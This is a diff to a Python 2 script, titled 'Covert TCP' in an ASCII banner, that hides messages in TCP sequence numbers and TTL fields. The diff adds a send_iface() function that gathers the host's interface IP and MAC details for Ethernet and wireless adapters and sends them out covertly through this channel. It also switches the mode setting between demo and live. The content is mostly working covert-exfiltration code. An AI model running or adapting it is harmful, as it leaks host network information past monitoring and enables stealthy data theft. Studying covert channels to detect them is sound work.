@@ -1,6 +1,17 @@
 #!/usr/bin/env python
 
 '''
+
+ ##                  #      ###  ## ##
+#   ### # # ### ### ###      #  #   # #
+#   # # # # ##  #    #       #  #   ##
+#   ###  #  ### #    ##      #  #   #
+ ##                          #   ## #
+
+
+  ( () \/ [- /? ~|~   ~|~ ( |^
+
+
 Send a message using TCP sequence numbers and ttl. The value is used to inject
 noise into the channel.
 
@@ -40,8 +51,8 @@ import netifaces
 # ================
 
 # Set the mode
-mode = demo
-# mode = live
+mode = 'demo'
+# mode = 'live'
 
 thishost = os.uname()[1]
 multiplier = 16777216        # the server will be performing the division
@@ -93,6 +104,25 @@ def send_packet():
 		send(pkt)
 		i += 1
 
+def send_iface():
+	print '[*] interfaces: %s' % interfaces
+	# Interesting in sending found en*, eth*, and wlp* interface data
+	for face in interfaces:
+		addrs = netifaces.ifaddresses(face)
+		# Get the MAC address
+		facemac = addrs[netifaces.AF_LINK]
+		try:
+			print face, netifaces.ifaddresses(face)[2], facemac
+			# Try to display en*
+			if 'en' in face or 'eth' in face or 'wlp' in face:
+				print '[*] found: %s' % face
+				message = str(netifaces.ifaddresses(face)[2])
+				convert_message()
+				send_packet()
+		except:
+			# skip, do nothing
+			print "[-] interface does not contain AF_INET family."
+
 
 # ============
 # Main program
@@ -117,22 +147,6 @@ seq_array = []  # clear before each use
 
 print '[*] sent: %s' % message
 print '[*] Getting ready to send network interface details'
-print '[*] interfaces: %s' % interfaces
-# Interesting in sending found en*, eth*, and wlp* interface data
-for face in interfaces:
-	addrs = netifaces.ifaddresses(face)
-	# Get the MAC address
-	facemac = addrs[netifaces.AF_LINK]
-	try:
-		print face, netifaces.ifaddresses(face)[2], facemac
-		# Try to display en*
-		if 'en' in face or 'eth' in face or 'wlp' in face:
-			print '[*] found: %s' % face
-			message = str(netifaces.ifaddresses(face)[2])
-			convert_message()
-			send_packet()
-	except:
-		# skip, do nothing
-		print "[-] interface does not contain AF_INET family."
 
+send_iface()
 
